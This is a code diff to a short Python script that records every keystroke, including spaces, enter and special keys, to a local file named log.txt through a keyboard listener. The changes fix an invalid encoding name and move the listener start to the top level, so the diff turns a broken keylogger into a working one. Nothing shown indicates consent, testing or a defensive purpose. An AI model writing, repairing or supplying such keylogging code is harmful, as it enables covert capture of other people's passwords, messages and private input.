@@ -15,7 +15,7 @@ def on_press(key):
         with open("log.txt", "a", encoding="utf-8") as f:
             f.write(key.char)
     except AttributeError:
-        with open("log.txt", "a", encoding="utf-9") as f:
+        with open("log.txt", "a", encoding="utf-8") as f:
             if key == keyboard.Key.space:
                 f.write(" ")
             elif key == keyboard.Key.enter:
@@ -30,6 +30,6 @@ def on_press(key):
                 pass
             else:
                 f.write(f"[{key}] ")
-                
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
+
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
